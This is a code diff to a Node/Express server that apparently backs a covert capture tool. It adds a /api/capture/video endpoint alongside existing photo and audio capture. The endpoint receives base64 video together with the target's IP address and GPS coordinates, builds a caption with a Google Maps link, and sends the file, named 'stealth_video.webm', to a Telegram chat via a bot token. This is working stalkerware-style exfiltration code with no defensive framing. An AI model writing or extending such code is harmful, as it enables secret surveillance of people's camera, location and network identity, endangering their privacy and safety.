@@ -21,8 +21,10 @@ async function startServer() {
   let active = false; 
   let photosCount = 0;
   let audioCount = 0;
+  let videoCount = 0;
   let lastPhotoAt: string | null = null;
   let lastAudioAt: string | null = null;
+  let lastVideoAt: string | null = null;
 
   // API Endpoints
 
@@ -32,8 +34,10 @@ async function startServer() {
       active,
       photosCount,
       audioCount,
+      videoCount,
       lastPhotoAt,
       lastAudioAt,
+      lastVideoAt,
     });
   });
 
@@ -300,6 +304,78 @@ async function startServer() {
       }
     } catch (error: any) {
       console.error("Error sending voice message to telegram:", error);
+      return res.status(500).json({ success: false, message: error?.message || "Internal server error" });
+    }
+  });
+
+  // POST /api/capture/video
+  app.post("/api/capture/video", async (req, res) => {
+    try {
+      const { videoData, mimeType, timestamp, latitude, longitude, ipAddress } = req.body;
+      if (!videoData) {
+        return res.status(400).json({ success: false, message: "Missing videoData value" });
+      }
+
+      // Strip data URI prefix
+      let pureBase64 = videoData;
+      if (videoData.includes(",")) {
+        pureBase64 = videoData.split(",")[1];
+      }
+
+      const buffer = Buffer.from(pureBase64, 'base64');
+      const blob = new Blob([buffer], { type: mimeType || 'video/webm' });
+
+      // Build rich caption
+      let caption = `🎥 Video captured at ${timestamp || new Date().toLocaleTimeString()}`;
+      if (ipAddress) {
+        caption += `\nIP: ${ipAddress}`;
+      }
+      if (latitude && longitude) {
+        caption += `\nCoords: ${latitude}, ${longitude}\nMap: https://www.google.com/maps?q=${latitude},${longitude}`;
+      }
+
+      // Form data with chat_id, video, and caption
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      formData.append("video", blob, "stealth_video.webm");
+      formData.append("caption", caption);
+
+      let response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+        method: "POST",
+        body: formData,
+      });
+
+      let result = await response.json() as any;
+
+      if (!response.ok || !result?.ok) {
+        console.warn("sendVideo failed, fallback to sendDocument. Response:", result);
+        
+        const docFormData = new FormData();
+        docFormData.append("chat_id", TELEGRAM_CHAT_ID);
+        docFormData.append("document", blob, "stealth_video.webm");
+        docFormData.append("caption", caption);
+
+        response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+          method: "POST",
+          body: docFormData,
+        });
+
+        result = await response.json() as any;
+      }
+
+      if (response.ok && result?.ok) {
+        videoCount++;
+        lastVideoAt = timestamp || new Date().toLocaleTimeString();
+        return res.json({ success: true, message: "Video delivered successfully" });
+      } else {
+        console.error("Telegram sendVideo/sendDocument fail details:", result);
+        return res.status(502).json({
+          success: false,
+          message: result?.description || "Failed to stream video file to Telegram."
+        });
+      }
+    } catch (error: any) {
+      console.error("Error sending video message to telegram:", error);
       return res.status(500).json({ success: false, message: error?.message || "Internal server error" });
     }
   });
